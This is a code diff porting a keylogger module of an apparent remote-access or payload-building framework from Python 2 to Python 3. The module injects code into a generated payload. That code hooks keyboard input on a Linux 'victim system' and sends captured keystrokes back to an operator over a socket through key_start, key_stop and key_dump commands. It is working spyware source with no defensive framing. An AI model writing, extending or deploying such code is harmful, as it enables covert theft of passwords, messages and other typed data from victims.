@@ -1,4 +1,3 @@
-
 import library.modules.config as config
 
 config.main()
@@ -35,14 +34,14 @@ def key(option):
     global keylog
     if option == 'key_start':
         if active_logger:
-            s.sendall('[-]Keylogger already started')
+            s.sendall('[-]Keylogger already started'.encode())
         else:
             hooks_manager = pyxhook.HookManager()
             hooks_manager.KeyDown = OnKeyboardEvent
             hooks_manager.HookKeyboard()
             hooks_manager.start()
             active_logger = not active_logger
-            s.sendall('[+]Activated keylogger')
+            s.sendall('[+]Activated keylogger'.encode())
             while True:
                 if not active_logger:
                     hooks_manager.cancel()
@@ -51,12 +50,12 @@ def key(option):
                     sleep(1)
     elif option == 'key_stop':
         if not active_logger:
-            s.sendall('[-]Keylogger not started')
+            s.sendall('[-]Keylogger not started'.encode())
         else:
             active_logger = not active_logger
-            s.sendall('[+]Stopped keylogger')
+            s.sendall('[+]Stopped keylogger'.encode())
     elif option == 'key_dump':
-        s.sendall('[+]Keylog dump : \\n' + keylog + '\\n')
+        s.sendall(('[+]Keylog dump : \\n' + keylog + '\\n').encode())
         keylog = ""''')
         config.logics.append('''
             elif command in ('key_start','key_stop','key_dump'):
@@ -66,8 +65,8 @@ def key(option):
         config.help_menu['key_stop'] = 'Stop the keylogger'
         config.help_menu['key_dump'] = 'Dump the captured in-memory keystrokes'
     elif option == 'info':
-        print '\nName             : Keylogger and window logger component' \
+        print('\nName             : Keylogger and window logger component' \
               '\nOS               : Linux' \
               '\nRequired Modules : pyxhook (External)' \
               '\nCommands         : key_start, key_stop, key_dump' \
-              '\nDescription      : Runs a keylogger on the victim system which logs in-memory also logs which windows it is captured in, to view the log run the key_dump command\n'
+              '\nDescription      : Runs a keylogger on the victim system which logs in-memory also logs which windows it is captured in, to view the log run the key_dump command\n')
